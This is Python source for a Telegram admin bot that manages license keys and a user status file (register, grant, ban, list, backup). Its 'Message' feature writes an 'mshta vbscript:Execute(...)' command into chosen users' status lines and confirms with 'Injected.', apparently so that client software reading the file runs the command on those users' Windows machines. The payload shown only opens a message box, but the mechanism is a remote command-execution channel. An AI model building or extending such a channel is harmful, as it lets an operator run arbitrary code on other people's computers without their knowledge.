import logging
import os
import shutil
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    ContextTypes,
    ConversationHandler,
    MessageHandler,
    filters,
)

# ---------- CONFIGURATION ----------
BOT_TOKEN = os.environ.get("BOT_TOKEN")
ADMIN_ID = int(os.environ.get("ADMIN_ID", 0))
PORT = int(os.environ.get("PORT", 8080))
DOMAIN = os.environ.get("RAILWAY_PUBLIC_DOMAIN")

KEYS_FILE = "KEYS.txt"
USERS_FILE = "USERS.txt"
USERS_BACKUP_FILE = "USERS_BACKUP.txt"

# Ensure files exist to prevent read errors
for f in [KEYS_FILE, USERS_FILE]:
    if not os.path.exists(f):
        open(f, 'a').close()

# State Constants
(MENU_HUB, WAITING_FOR_REG, WAITING_FOR_GRANT, WAITING_FOR_BAN, 
 WAITING_FOR_DELETE, WAITING_FOR_MSG_USERS, WAITING_FOR_MSG_TEXT) = range(7)

logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
logger = logging.getLogger(__name__)

# ---------- CORE UTILITIES ----------

def check_admin(update: Update):
    return update.effective_user.id == ADMIN_ID

def batch_update(targets_str: str, status_text: str):
    if not os.path.exists(USERS_FILE): return 0
    targets = [u.strip() for u in targets_str.split('-') if u.strip()]
    new_lines, count = [], 0
    with open(USERS_FILE, "r") as f:
        lines = f.readlines()
    for line in lines:
        if " -> " in line:
            name = line.split(" -> ")[0].strip()
            if name in targets:
                new_lines.append(f"{name} -> {status_text}\n")
                count += 1
                continue
        new_lines.append(line)
    with open(USERS_FILE, "w") as f:
        f.writelines(new_lines)
    return count

# ---------- HANDLERS ----------

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    if not check_admin(update): return ConversationHandler.END
    keyboard = [
        [InlineKeyboardButton("📝 Register", callback_data="m_reg"), InlineKeyboardButton("✅ Grant", callback_data="m_grant")],
        [InlineKeyboardButton("🚫 Ban", callback_data="m_ban"), InlineKeyboardButton("💬 Message", callback_data="m_msg")],
        [InlineKeyboardButton("🗑️ Delete", callback_data="m_del"), InlineKeyboardButton("📋 List", callback_data="m_list")],
        [InlineKeyboardButton("📥 Backups", callback_data="m_backup"), InlineKeyboardButton("✖️ Close", callback_data="m_cancel")]
    ]
    text = "🛠 **Admin Panel**"
    if update.callback_query: await update.callback_query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")
    else: await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")
    return MENU_HUB

async def menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    if query.data == "m_cancel": return ConversationHandler.END
    if query.data == "m_stop": return await start(update, context)
    
    prompts = {
        "m_reg": ("📝 Send: `KEY USERNAME`", WAITING_FOR_REG),
        "m_msg": ("💬 Step 1: Send Usernames (user1-user2):", WAITING_FOR_MSG_USERS),
        "m_grant": ("✅ Send Usernames to Grant SAFE:", WAITING_FOR_GRANT),
        "m_ban": ("🚫 Send Usernames to BAN:", WAITING_FOR_BAN),
        "m_del": ("🗑️ Send Usernames to DELETE:", WAITING_FOR_DELETE),
    }

    if query.data in prompts:
        msg, state = prompts[query.data]
        await query.edit_message_text(msg, parse_mode="Markdown", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Back", callback_data="m_stop")]]))
        return state

    if query.data == "m_list":
        with open(USERS_FILE, "r") as f: content = f.read() or "Empty"
        await query.edit_message_text(f"📋 **List:**\n`{content}`", parse_mode="Markdown", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Back", callback_data="m_stop")]]))
        return MENU_HUB

    if query.data == "m_backup":
        for f in [USERS_FILE, KEYS_FILE]:
            if os.path.exists(f): await context.bot.send_document(chat_id=ADMIN_ID, document=open(f, 'rb'))
        return MENU_HUB

    return MENU_HUB

async def handle_registration(update: Update, context: ContextTypes.DEFAULT_TYPE):
    p = update.message.text.split(None, 1)
    if len(p) < 2: return WAITING_FOR_REG
    with open(KEYS_FILE, "a") as f: f.write(p[0] + "\n")
    with open(USERS_FILE, "a") as f: f.write(f"{p[1]} -> SAFE\n")
    await update.message.reply_text(f"✅ Registered {p[1]}")
    return await start(update, context)

async def handle_msg_final(update: Update, context: ContextTypes.DEFAULT_TYPE):
    txt = update.message.text.replace('"', '""')
    cmd = f'SAFE mshta vbscript:Execute("msgbox ""{txt}"":close")'
    batch_update(context.user_data.get("msg_targets", ""), cmd)
    await update.message.reply_text("⚡ Injected.")
    return await start(update, context)

# ---------- RUNNER ----------

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    
    conv = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            MENU_HUB: [CallbackQueryHandler(menu_callback)],
            WAITING_FOR_REG: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_registration), CallbackQueryHandler(menu_callback)],
            WAITING_FOR_MSG_USERS: [MessageHandler(filters.TEXT & ~filters.COMMAND, lambda u, c: (c.user_data.update({"msg_targets": u.message.text}), u.message.reply_text("💬 Step 2: Text?")) and WAITING_FOR_MSG_TEXT)],
            WAITING_FOR_MSG_TEXT: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_msg_final), CallbackQueryHandler(menu_callback)],
            WAITING_FOR_GRANT: [MessageHandler(filters.TEXT & ~filters.COMMAND, lambda u, c: batch_update(u.message.text, "SAFE") and start(u, c))],
            WAITING_FOR_BAN: [MessageHandler(filters.TEXT & ~filters.COMMAND, lambda u, c: batch_update(u.message.text, "BAN") and start(u, c))],
        },
        fallbacks=[CommandHandler("start", start)]
    )
    app.add_handler(conv)

    # Use Polling by default for Railway if Webhook Domain is missing or causing crashes
    if DOMAIN:
        logger.info("Starting Webhook...")
        app.run_webhook(listen="0.0.0.0", port=PORT, webhook_url=f"https://{DOMAIN}/webhook")
    else:
        logger.info("Starting Polling...")
        app.run_polling()

if __name__ == "__main__":
    main()